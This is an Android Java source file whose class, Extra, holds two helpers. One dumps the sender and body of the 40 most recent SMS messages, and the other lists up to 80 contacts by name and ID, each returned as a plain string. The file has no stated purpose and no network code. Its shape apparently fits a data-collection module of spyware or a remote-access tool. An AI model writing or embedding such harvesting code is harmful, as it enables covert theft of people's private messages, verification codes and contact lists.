package com.aval.seg;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public final class Extra {

    public static String sms(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor cu = c.getContentResolver().query(
                Uri.parse("content://sms"), null, null, null, "date DESC")) {
            if (cu == null) return "sem permissao";
            int n = 0;
            while (cu.moveToNext() && n++ < 40) {
                s.append(cu.getString(cu.getColumnIndexOrThrow("address")))
                 .append(" | ").append(cu.getString(cu.getColumnIndexOrThrow("body")))
                 .append('\n');
            }
        } catch (Throwable t) { return "err " + t; }
        return s.toString();
    }

    public static String contacts(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor cu = c.getContentResolver().query(
                Uri.parse("content://contacts/people"), null, null, null, null)) {
            if (cu == null) return "sem permissao";
            int n = 0;
            while (cu.moveToNext() && n++ < 80) {
                s.append(cu.getString(cu.getColumnIndexOrThrow("display_name")))
                 .append(" | ").append(cu.getString(cu.getColumnIndexOrThrow("_id")))
                 .append('\n');
            }
        } catch (Throwable t) { return "err " + t; }
        return s.toString();
    }
}
